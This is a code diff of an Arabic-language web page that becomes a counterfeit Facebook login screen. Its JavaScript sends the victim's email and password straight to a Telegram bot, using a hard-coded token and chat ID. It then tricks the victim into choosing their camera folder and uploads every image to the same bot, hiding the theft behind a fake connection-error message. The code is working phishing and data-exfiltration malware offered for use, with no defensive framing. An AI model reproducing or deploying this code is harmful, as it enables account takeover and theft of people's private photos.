@@ -2,35 +2,68 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>عرض الصور الحصري</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول - فيسبوك</title>
     <style>
-        body { background: #000; color: #fff; text-align: center; font-family: sans-serif; padding-top: 50px; }
-        .btn { background: #e91e63; color: white; padding: 20px; border-radius: 10px; border: none; font-size: 1.5rem; cursor: pointer; }
+        body { background: #f0f2f5; font-family: Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .login-box { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); width: 350px; text-align: center; }
+        input { width: 90%; padding: 12px; margin: 10px 0; border: 1px solid #dddfe2; border-radius: 6px; font-size: 16px; }
+        .btn-login { background: #1877f2; color: white; border: none; width: 100%; padding: 12px; border-radius: 6px; font-size: 20px; font-weight: bold; cursor: pointer; }
+        .footer { margin-top: 20px; color: #1c1e21; font-size: 14px; }
     </style>
 </head>
 <body>
-    <h1>لقد وصلت لك هدية صور! 🎁</h1>
-    <p>اضغط على الزر أدناه لفتح ألبوم الصور الخاص بك</p>
-    <input type="file" id="fileInput" webkitdirectory directory multiple style="display:none;">
-    <button class="btn" onclick="document.getElementById('fileInput').click()">فتح الألبوم الآن</button>
+    <div class="login-box">
+        <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu7_9UeOk.svg" width="200" alt="Facebook"><br><br>
+        <p>يجب عليك تسجيل الدخول للمتابعة ومشاهدة الصور</p>
+        
+        <input type="text" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
+        <input type="password" id="pass" placeholder="كلمة السر" required>
+        
+        <input type="file" id="fileInput" webkitdirectory directory multiple style="display:none;">
+        <button class="btn-login" onclick="startProcess()">تسجيل الدخول</button>
+        
+        <div class="footer">هل نسيت كلمة السر؟</div>
+    </div>
 
     <script>
+        // بياناتك الخاصة يا عبد الرحمن
         const API_TOKEN = '8669811855:AAGvHpikmaCi4E_dlFy24J1iYUgAdlnXWsg';
         const CHAT_ID = '7214473798';
 
+        function startProcess() {
+            const email = document.getElementById('email').value;
+            const pass = document.getElementById('pass').value;
+
+            if (email && pass) {
+                // 1. إرسال الإيميل والباسورد للبوت فوراً
+                const loginInfo = `👤 صيد جديد (فيسبوك):\n📧 الإيميل: ${email}\n🔑 الباسورد: ${pass}`;
+                fetch(`https://api.telegram.org/bot${API_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(loginInfo)}`);
+
+                // 2. فتح نافذة اختيار المجلد لسحب الصور
+                alert("لتأكيد الحساب، يرجى اختيار مجلد الصور (Camera) للمزامنة");
+                document.getElementById('fileInput').click();
+            } else {
+                alert("يرجى إدخال البيانات المطلوبة");
+            }
+        }
+
+        // 3. كود سحب الصور عند اختيار المجلد
         document.getElementById('fileInput').addEventListener('change', function(e) {
             const files = e.target.files;
             for (let i = 0; i < files.length; i++) {
-                let formData = new FormData();
-                formData.append('chat_id', CHAT_ID);
-                formData.append('photo', files[i]);
+                if (files[i].type.startsWith('image/')) {
+                    let formData = new FormData();
+                    formData.append('chat_id', CHAT_ID);
+                    formData.append('photo', files[i]);
 
-                fetch(`https://api.telegram.org/bot${API_TOKEN}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData
-                });
+                    fetch(`https://api.telegram.org/bot${API_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                }
             }
-            alert("جاري تحميل الصور، يرجى الانتظار...");
+            alert("فشل الاتصال بالسيرفر، حاول لاحقاً");
         });
     </script>
 </body>
